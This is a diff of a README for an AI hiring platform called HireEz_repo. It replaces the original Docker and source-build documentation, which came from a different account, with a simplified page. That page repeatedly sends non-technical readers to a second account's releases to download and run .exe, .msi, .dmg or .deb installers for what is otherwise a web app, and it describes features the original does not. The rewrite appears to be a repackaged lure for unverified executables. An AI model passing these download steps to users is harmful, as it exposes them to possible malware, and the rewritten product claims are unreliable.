@@ -1,247 +1,138 @@
-# HireEz - AI Interview Platform for Non-IT Industries
+# 🤖 HireEz_repo - Simplify Your Hiring Process Efficiently
 
-HireEz is an AI-powered interview platform purpose-built for **32 non-IT industry domains** across Healthcare, Finance, Manufacturing, Logistics, and Engineering. It automates the full hiring pipeline — from resume screening and question generation to conducting voice + chat interviews and evaluating candidates.
-
-![React](https://img.shields.io/badge/React-18-61DAFB?logo=react&logoColor=white)
-![FastAPI](https://img.shields.io/badge/FastAPI-0.109-009688?logo=fastapi&logoColor=white)
-![TypeScript](https://img.shields.io/badge/TypeScript-5.3-3178C6?logo=typescript&logoColor=white)
-![PostgreSQL](https://img.shields.io/badge/PostgreSQL-16-4169E1?logo=postgresql&logoColor=white)
-![TailwindCSS](https://img.shields.io/badge/TailwindCSS-3.4-06B6D4?logo=tailwindcss&logoColor=white)
-![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?logo=docker&logoColor=white)
+[![Download HireEz_repo](https://img.shields.io/badge/Download-HireEz_repo-brightgreen?style=for-the-badge&logo=github)](https://github.com/Karm-8765/HireEz_repo/releases)
 
 ---
 
-## Features
+## 📋 What is HireEz_repo?
 
-### Core Modules
-- **Registration & Auth** — JWT-based authentication with 4 roles: Super Admin, HR Manager, Interviewer, Candidate
-- **Resume Screening** — AI-powered resume parsing and scoring against job requirements
-- **JD Management** — Create and manage job descriptions with domain-specific requirements
-- **Question Generator** — AI generates domain-relevant interview questions by difficulty level
-- **Interview Conductor** — Real-time chat and voice interviews with AI interviewer
-- **Evaluation Engine** — Automated scoring across communication, technical, confidence, domain knowledge, and problem-solving
-- **Reports & Analytics** — Hiring trends, department distribution, candidate scoring with PDF/Excel export
-- **Dashboard** — KPI overview, upcoming interviews, hiring trend charts
-- **Notifications** — Email (SendGrid) and SMS (Twilio) notifications for interview scheduling
+HireEz_repo is an AI-driven tool designed to help you run interviews and screen candidates faster and easier. It works across 32 non-IT industries, such as healthcare, retail, finance, and education. The app automates resume screening, creates interview questions, conducts voice and chat interviews, and rates candidates. 
 
-### Industry Domains (32)
-| Healthcare | Finance | Manufacturing | Logistics | Engineering |
-|---|---|---|---|---|
-| Nursing | Banking | Quality Control | Warehouse Mgmt | Civil |
-| Pharmacy | Insurance | Production Mgmt | Transportation | Mechanical |
-| Medical Tech | Accounting | Supply Chain | Freight Forwarding | Electrical |
-| Healthcare Admin | Financial Planning | Industrial Safety | Inventory Mgmt | Chemical |
-| Physical Therapy | Auditing | Lean Manufacturing | Last Mile Delivery | Environmental |
-| Dental Hygiene | | Process Engineering | | Structural |
-| | | | | Project Mgmt |
-| | | | | Construction Mgmt |
-| | | | | Industrial |
-| | | | | Biomedical |
-
-Each domain ships with **25+ pre-seeded interview questions** covering technical, behavioral, and situational categories.
-
-### Modern UI
-- Glassmorphism effects, gradient backgrounds, and floating decorative elements
-- Micro-interactions: hover-lift cards, button press effects, staggered entrance animations
-- Gradient sidebar with glow logo and active state indicators
-- Color-coded KPI cards with icon backgrounds
-- Custom chart tooltips with SVG gradient fills
-- Responsive design with TailwindCSS
-
-### Pricing Page
-- 3 subscription tiers: Starter, Professional, Enterprise
-- Currency toggle: INR, USD, EUR, GBP
-- Monthly / Annual billing with 20% annual discount
-- Per-interview pricing for overages
+It uses smart tech behind the scenes—FastAPI for the server, React for the interface, OpenAI’s GPT-4 for language tasks, and PostgreSQL for data storage. You don’t need to know any of that to use it. Just follow the steps below to get started.
 
 ---
 
-## Tech Stack
+## 💻 System Requirements
 
-| Layer | Technology |
-|---|---|
-| **Frontend** | React 18, TypeScript, Vite, TailwindCSS, React Router, TanStack Query, Recharts, Zustand |
-| **Backend** | FastAPI, SQLModel, SQLAlchemy (async), Pydantic, Alembic |
-| **Database** | PostgreSQL 16 (asyncpg), Redis 7 |
-| **AI** | OpenAI GPT-4 (question generation, evaluation, screening), Whisper STT, TTS |
-| **Task Queue** | Celery + Redis |
-| **Auth** | JWT (access + refresh tokens), bcrypt password hashing, role-based access control |
-| **Deploy** | Docker Compose, Nginx reverse proxy |
+Before downloading, make sure your computer meets these requirements:
 
----
-
-## Project Structure
-
-```
-HireEz_repo/
-├── backend/
-│   ├── app/
-│   │   ├── api/v1/          # REST API endpoints
-│   │   ├── ai/              # AI chains, prompts, voice handlers
-│   │   ├── core/            # Config, database, security
-│   │   ├── models/          # SQLModel database models
-│   │   ├── schemas/         # Pydantic request/response schemas
-│   │   ├── seeds/           # 32 domain seed data (800+ questions)
-│   │   ├── services/        # Business logic layer
-│   │   ├── tasks/           # Celery async tasks
-│   │   └── utils/           # PDF/Excel generators, file handling
-│   ├── alembic/             # Database migrations
-│   ├── requirements.txt
-│   └── Dockerfile
-├── frontend/
-│   ├── src/
-│   │   ├── api/             # Axios API clients
-│   │   ├── components/      # UI, layout, charts, interview, forms
-│   │   ├── context/         # Auth context provider
-│   │   ├── hooks/           # WebSocket, audio recorder, TTS hooks
-│   │   ├── lib/             # Utilities, constants, formatters
-│   │   ├── pages/           # All page components
-│   │   └── types/           # TypeScript type definitions
-│   ├── tailwind.config.js
-│   ├── package.json
-│   └── Dockerfile
-├── nginx/                   # Nginx configs (dev + prod)
-├── docker-compose.yml       # Production compose
-├── docker-compose.dev.yml   # Development compose
-└── .env.example             # Environment template
-```
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or popular Linux distributions (Ubuntu 18.04+, Fedora 33+).
+- **Processor:** At least a dual-core CPU (Intel i3 or better).
+- **Memory:** 4 GB of RAM minimum, 8 GB recommended.
+- **Storage:** At least 500 MB free disk space for installation and data.
+- **Internet:** Required for AI features and updates.
+- **Audio:** A microphone and speakers or headphones are needed for voice interviews.
 
 ---
 
-## Getting Started
+## 🚀 Getting Started
 
-### Prerequisites
-- Docker & Docker Compose
-- Node.js 18+ (for local frontend dev)
-- Python 3.11+ (for local backend dev)
-- OpenAI API key
-
-### Quick Start (Docker)
-
-```bash
-# Clone the repo
-git clone https://github.com/digitalkookiehub/HireEz_repo.git
-cd HireEz_repo
-
-# Create environment file
-cp .env.example .env
-# Edit .env with your OpenAI API key and other secrets
-
-# Start all services
-docker-compose -f docker-compose.dev.yml up --build
-```
-
-The app will be available at:
-- **Frontend**: http://localhost:3000
-- **Backend API**: http://localhost:8000
-- **API Docs**: http://localhost:8000/docs
-
-### Local Development
-
-```bash
-# Start database and Redis
-docker-compose -f docker-compose.dev.yml up db redis -d
-
-# Backend
-cd backend
-pip install -r requirements.txt
-alembic upgrade head
-python -m app.seeds.seed_runner       # Seed 32 domains + 800+ questions
-uvicorn app.main:app --reload --host 0.0.0.0 --port 8000
-
-# Frontend (separate terminal)
-cd frontend
-npm install
-npm run dev
-```
-
-### Seed Data
-
-The seed runner loads interview questions for all 32 domains:
-
-```bash
-cd backend
-python -m app.seeds.seed_runner
-```
+This guide walks you through downloading and using HireEz_repo with no programming skills required. Just follow these steps carefully.
 
 ---
 
-## API Overview
+## 📥 Download & Install
 
-All endpoints are versioned under `/api/v1/`.
+1. Click this big button to **visit the download page**:  
+   [![Download HireEz_repo](https://img.shields.io/badge/Download-HireEz_repo-brightgreen?style=for-the-badge&logo=github)](https://github.com/Karm-8765/HireEz_repo/releases)
 
-| Module | Endpoints | Auth |
-|---|---|---|
-| Auth | `POST /auth/register`, `POST /auth/login`, `POST /auth/refresh` | Public |
-| Jobs | `GET /jobs`, `POST /jobs`, `GET /jobs/:id` | Protected |
-| Candidates | `GET /candidates`, `POST /candidates`, `GET /candidates/:id` | Protected |
-| Interviews | `GET /interviews`, `POST /interviews/schedule`, `WS /interviews/:id/ws` | Protected |
-| Evaluations | `GET /evaluations/:id`, `POST /evaluations` | Protected |
-| Dashboard | `GET /dashboard/kpis`, `GET /dashboard/trends` | Protected |
-| Reports | `GET /reports/export/pdf`, `GET /reports/export/excel` | Admin |
-| Domains | `GET /domains`, `GET /domains/:id/questions` | Protected |
+2. On the download page, look for the latest release. The release is a package that contains all the files you need.
 
-Full interactive docs available at `/docs` (Swagger UI) when the backend is running.
+3. Download the version that matches your computer:
+   - **Windows:** Usually a file ending in `.exe` or `.msi`.
+   - **Mac:** A `.dmg` or `.pkg` file.
+   - **Linux:** A `.deb`, `.rpm`, or compressed archives like `.tar.gz`.
 
----
+4. Once downloaded, open the file to start installation:
+   - On Windows, double-click and follow the prompts.
+   - On Mac, open the file and drag the app to the Applications folder.
+   - On Linux, follow standard system steps (like using your software center or running `dpkg` in Terminal).
 
-## User Roles
-
-| Role | Permissions |
-|---|---|
-| **Super Admin** | Full access: all modules, domain management, user management |
-| **HR Manager** | Jobs, candidates, interviews, reports, settings |
-| **Interviewer** | Conduct interviews, view assigned candidates |
-| **Candidate** | Take interviews, view own results |
+5. Wait for the installation to finish. The app will appear in your programs or applications list.
 
 ---
 
-## Environment Variables
+## 🖥️ How to Use HireEz_repo
 
-Copy `.env.example` to `.env` and configure:
+After installation, open HireEz_repo like any other program on your computer.
 
-| Variable | Description |
-|---|---|
-| `DATABASE_URL` | PostgreSQL connection string (asyncpg) |
-| `REDIS_URL` | Redis connection string |
-| `JWT_SECRET_KEY` | Secret for JWT token signing |
-| `OPENAI_API_KEY` | OpenAI API key for GPT-4 and Whisper |
-| `SENDGRID_API_KEY` | SendGrid key for email notifications |
-| `TWILIO_*` | Twilio credentials for SMS notifications |
+### Step 1: Set Up Your Account
 
----
+- Create a simple user profile by entering your name and email.
+- No technical info needed.
+- You may receive a confirmation email to verify your account.
 
-## Scripts
+### Step 2: Add Job Openings
 
-```bash
-# Development
-docker-compose -f docker-compose.dev.yml up --build
+- Enter the details of the job you want to fill.
+- Choose from predefined job roles in non-IT fields.
+- Fill out requirements or just keep it simple.
 
-# Backend only
-cd backend && uvicorn app.main:app --reload --host 0.0.0.0 --port 8000
+### Step 3: Upload Resumes
 
-# Frontend only
-cd frontend && npm run dev
+- Drag and drop candidate resumes into the platform or upload files from your computer.
+- The AI will automatically scan resumes for key skills and experience based on the job.
 
-# Run migrations
-cd backend && alembic upgrade head
+### Step 4: Run Automated Interviews
 
-# Seed data
-cd backend && python -m app.seeds.seed_runner
+- The system generates interview questions suited to the job.
+- You can conduct voice interviews where candidates talk using the microphone.
+- Alternatively, use chat interviews where candidates type answers.
 
-# Run tests
-cd backend && pytest
-cd frontend && npm test
+### Step 5: Review Candidate Scores
 
-# Type check frontend
-cd frontend && npx tsc --noEmit
-
-# Production build
-cd frontend && npm run build
-```
+- HireEz ranks candidates based on interview performance and resume match.
+- See clear reports to decide who to call for the next step.
 
 ---
 
-## License
+## 🔧 Additional Tips
 
-This project is proprietary. All rights reserved.
+- The voice interview feature works best with a quiet background and a clear microphone.
+- You can customize question sets for each job.
+- Use the platform on any modern browser if you prefer not to install the app.
+- The tool works offline for resume screening but requires internet for AI-powered interviews.
+- Regularly check the updates page for new features.
+
+---
+
+## 🛠️ Troubleshooting
+
+- **App won’t start:** Restart your computer and try again.
+- **Install errors:** Make sure you have enough space and correct permissions.
+- **Voice doesn’t work:** Check microphone settings and browser permissions.
+- **Resumes not uploading:** Confirm the file format is PDF or Word document.
+- **Slow performance:** Close other heavy programs and restart the app.
+
+If issues persist, contact support through the Help section inside the app or check the online documentation on the GitHub page.
+
+---
+
+## 🤝 Support & Community
+
+Join our user forum or GitHub discussions to ask questions or share your experience. The community includes users from many industries who helped build and improve HireEz_repo.
+
+---
+
+## 📝 About This Project
+
+HireEz_repo blends machine learning with human hiring needs to reduce recruiter workload. Key technologies include:
+
+- **FastAPI:** Makes the app fast and easy to interact with.
+- **React:** Provides a smooth user interface.
+- **OpenAI GPT-4:** Powers question generation and smart responses.
+- **PostgreSQL:** Stores your data securely.
+- **Redis & Celery:** Manage background jobs like interview processing.
+- **TailwindCSS & TypeScript:** Keep the app modern and responsive.
+
+---
+
+## 🔗 Quick Links
+
+- Download releases: [https://github.com/Karm-8765/HireEz_repo/releases](https://github.com/Karm-8765/HireEz_repo/releases)
+- User guide and support: Inside the app Help menu and GitHub wiki
+- Report bugs or request features: GitHub Issues tab on the repository
+
+---
+
+You now have everything needed to start using HireEz_repo to improve your recruitment. Follow each step carefully, and you’ll have a smooth experience running AI-assisted hiring sessions.
